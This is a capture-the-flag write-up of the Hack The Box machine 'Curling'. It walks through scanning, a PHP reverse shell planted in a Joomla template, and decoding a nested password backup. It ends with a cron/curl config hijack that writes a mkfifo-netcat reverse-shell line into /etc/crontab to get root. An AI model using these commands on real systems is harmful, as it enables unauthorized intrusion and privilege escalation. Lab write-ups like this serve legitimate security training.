# Curling 

Machine Level: Easy <br />
OS: Linux

## Scanning 
I ran an aggressive NMAP scan to find open ports and services. 
```
ajread@aj-ubuntu:~/hackthebox$ nmap -A [TARGET IP] -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-17 15:55 EST
Nmap scan report for [TARGET IP] 
Host is up (0.012s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds
```
## Enumeration
In the source of the website, I noticed a reference to ```secret.txt``` at the bottom. 
```
 <!-- secret.txt -->
```
Therefore, I navigated to the site and found what appeared to be a password for some user. Looking at the previous site, the best guess would be for user "Floris". The password was Base64 encoded, so I needed to decode it before use. I needed to find the admin page to login. 
```
ajread@aj-ubuntu:~/hackthebox$ gobuster -u http://[TARGET IP] -w ~/resources/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://[TARGET IP]/
[+] Threads      : 10
[+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/02/17 15:56:39 Starting gobuster
=====================================================
/images (Status: 301)
/media (Status: 301)
/templates (Status: 301)
/modules (Status: 301)
/bin (Status: 301)
/plugins (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/components (Status: 301)
/cache (Status: 301)
/libraries (Status: 301)
/tmp (Status: 301)
/layouts (Status: 301)
/administrator (Status: 301)
/cli (Status: 301)
/server-status (Status: 403)
=====================================================
2023/02/17 16:02:37 Finished
=====================================================
```
## Initial Access
I looked around and noticed that I could change the index.php site. There, I decided to edit the ```jsstrings.php``` file with a php reverse shell from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell). With that set, I needed to start a listener on my local machine. 
```
ajread@aj-ubuntu:~/hackthebox/htb_writeups$ nc -lnvp 9999
Listening on 0.0.0.0 9999
```
And run the ```jstrings.php``` file by navigating to it in the browswer. 
```
http://[TARGET IP]/templates/beez3/jsstrings.php
```
I was able to catch the reverse shell and I was dropped in as ```www-data```. 
```
ajread@aj-ubuntu:~/hackthebox/htb_writeups$ nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on [TARGET IP] 35632
Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 21:00:26 up 22:14,  0 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
In the home directory of user, floris, I was able to find a password_backup. 
```
$ ls -la
total 44
drwxr-xr-x 6 floris floris 4096 Aug  2  2022 .
drwxr-xr-x 3 root   root   4096 Aug  2  2022 ..
lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -> /dev/null
-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 floris floris 3771 Apr  4  2018 .bashrc
drwx------ 2 floris floris 4096 Aug  2  2022 .cache
drwx------ 3 floris floris 4096 Aug  2  2022 .gnupg
drwxrwxr-x 3 floris floris 4096 Aug  2  2022 .local
-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
drwxr-x--- 2 root   floris 4096 Aug  2  2022 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 Feb 18 22:46 user.txt
```
I attempted to look at the file and it appeared to be a .BZ file based on its magic numbers. I needed to grab the file and format properly because it was currently enterpreted as ASCII text. 
```
$ file password_backup
password_backup: ASCII text
```
I copied the file over and kept only the ASCII output. 
```
ajread@aj-ubuntu:~/hackthebox/$ file password_backup.bz 
password_backup.bz: bzip2 compressed data, block size = 900k
```
However, I was having issues decompressing that data. So, I copied the entire hexdump from the target machine to my local machine and used ```xxd -r``` to reverse the hexdump to a new file. 
```
ajread@aj-ubuntu:~/hackthebox/$ cat passwordbackup | xxd -r > password_backup_correct
```
Then, I decompressed with bzip2. 
```
ajread@aj-ubuntu:~/hackthebox/$ bzip2 -dk password_backup_correct
bzip2: Can't guess original name for password_backup_correct -- using password_backup_correct.out
```
I looked like the new compressed data is in the format of gzip. 
```
ajread@aj-ubuntu:~/hackthebox/$ file password_backup_correct.out 
password_backup_correct.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141
```
I decompressed the file in gzip to find that it is another bzip2 formatted file. 
```
ajread@aj-ubuntu:~/hackthebox/$ gzip -d pass.gz 
ajread@aj-ubuntu:~/hackthebox/$ file pass
pass: bzip2 compressed data, block size = 900k
```
I copied it to a new file and decompressed again. 
```
ajread@aj-ubuntu:~/hackthebox/$ cp pass pass_out.bz2
ajread@aj-ubuntu:~/hackthebox/$ bzip2 -d pass_out.bz2 
```
The new file appeared to be a POSIX tar archive.
```
ajread@aj-ubuntu:~/hackthebox/$ file pass_out
pass_out: POSIX tar archive (GNU)
```
I copied the file to a new name and then used ```tar``` to extract the contents, which appeared to be a password file. 
```
ajread@aj-ubuntu:~/hackthebox/$ tar xvf passtar_out.tar
password.txt
ajread@aj-ubuntu:~/hackthebox/$ wc -c password.txt 
19 password.txt
```
I used the contents to ssh into the machine as user floris. 
```
floris@curling:~$ id
uid=1000(floris) gid=1004(floris) groups=1004(floris)
```
And I was able to read the contents of the user flag.
```
floris@curling:~$ wc -c user.txt 
33 user.txt
```
## Privilege Escalation 
I remembered seeing the ```admin-area``` folder within the user directory where I found the user flag and the compressed password file. I listed the cronjobs to see if there was anything interesting. 
```
floris@curling:~/admin-area$ ls -la
total 28
drwxr-x--- 2 root   floris  4096 Aug  2  2022 .
drwxr-xr-x 6 floris floris  4096 Aug  2  2022 ..
-rw-rw---- 1 root   floris    25 Feb 19 21:48 input
-rw-rw---- 1 root   floris 14236 Feb 19 21:48 report
```
I used the official write up to help me with this portion. I downloaded [pspy](https://github.com/DominicBreuker/pspy), copied it over using SCP, and used it to find the crons running on the machine. After running the tool, I was able to find that every minute there was a curl command to the admin area, run by root. 
```
2023/02/19 22:44:01 CMD: UID=0    PID=28489  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
```
It appeared that the command would open a shell script, run the curl command, using the input as a config file and the output to the report. Therefore, if I can change the config file I can have it call my machine and execute code. Using the write up from HTB, I created a local crontab and cron to call back to my machine. 
```
ajread@aj-ubuntu:~/hackthebox/$ cp /etc/crontab .
ajread@aj-ubuntu:~/hackthebox/$ echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LOCAL IP] 6666 >/tmp/f ' >> crontab
```
I started up an http server on my local machine. 
```
ajread@aj-ubuntu:~/hackthebox/$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
I changed the input file on floris' machine. 
```
floris@curling:~/admin-area$ cat input 
url = "http://[LOCAL IP]:8000/crontab"
output="/etc/crontab"
```
I saw the GET request from the remote machine.
```
ajread@aj-ubuntu:~/hackthebox/$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
[TARGET IP] - - [19/Feb/2023 17:57:03] "GET /crontab HTTP/1.1" 200 -
```
And shortly after, I was dropped into a shell as root. 
```
ajread@aj-ubuntu:~/hackthebox$ nc -lnvp 6666
Listening on 0.0.0.0 6666
Connection received on [TARGET IP] 40360
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
I was able to read the root flag! 
```
# wc -c /root/root.txt
33 /root/root.txt
```